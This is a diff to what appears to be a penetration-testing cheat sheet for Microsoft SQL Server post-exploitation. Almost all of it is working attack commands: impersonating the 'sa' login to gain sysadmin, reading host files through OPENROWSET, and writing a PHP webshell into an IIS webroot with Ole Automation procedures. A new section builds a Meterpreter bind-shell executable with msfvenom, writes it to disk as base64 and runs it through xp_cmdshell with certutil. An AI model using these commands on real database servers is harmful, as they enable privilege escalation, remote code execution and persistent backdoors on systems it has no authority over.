@@ -59,26 +59,19 @@ USE <DATABASE> ;
 SELECT name FROM sys.tables;
 ```
 
-## Read Files
+## Impersonate User
 
 ```sql
-SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
-```
-## Write Files (to achieve command execution)
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
+GO
 
-```sql
-sp_configure 'show advanced options', 1
-RECONFIGURE
-sp_configure 'Ole Automation Procedures', 1
-RECONFIGURE
-
-DECLARE @OLE INT
-DECLARE @FileID INT
-EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
-EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
-EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
-EXECUTE sp_OADestroy @FileID
-EXECUTE sp_OADestroy @OLE
+-- Impersonating the SA User (admin)
+USE master
+EXECUTE AS LOGIN = 'sa'
+-- Verify
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+-- 0 is NOT admin
 ```
 
 ## Enable xp_cmdshell
@@ -99,19 +92,59 @@ xp_cmdshell <COMMAND>
 EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]
 ```
 
-## Impersonate User
+## Read Files
 
 ```sql
-SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
-GO
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+```
 
--- Impersonating the SA User (admin)
-USE master
-EXECUTE AS LOGIN = 'sa'
--- Verify
-SELECT SYSTEM_USER
-SELECT IS_SRVROLEMEMBER('sysadmin')
--- 0 is NOT admin
+## Write Files/Command Execution
+
+### Webshell
+
+```sql
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+```
+
+### Binary Payload via Base64
+
+#### Attacker Prep
+
+```bash
+# Generate payload, base64 encode, strip newlines, copy to clipboard
+msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<LPORT> -f exe > bind_shell_x64.exe
+base64 -w 0 bind_shell_x64.exe > bind_shell_x64.b64
+cat bind_shell_x64.b64 | tr -d '\n' > bind_shell_clean.b64
+cat bind_shell_clean.b64 | xclip
+```
+
+#### Write Payload
+
+Replace `<BASE64>`
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+DECLARE @OLE INT; DECLARE @FileID INT; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\Users\Public\output.b64', 8, 1; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<BASE64>'; EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
+```
+
+#### Execute
+
+```sql
+exec xp_cmdshell 'dir C:\Users\Public'
+exec xp_cmdshell 'certutil -decode C:\Users\Public\output.b64 C:\Users\Public\output.exe'
+exec xp_cmdshell 'C:\Users\Public\output.exe'
 ```
 
 ## Linked Servers
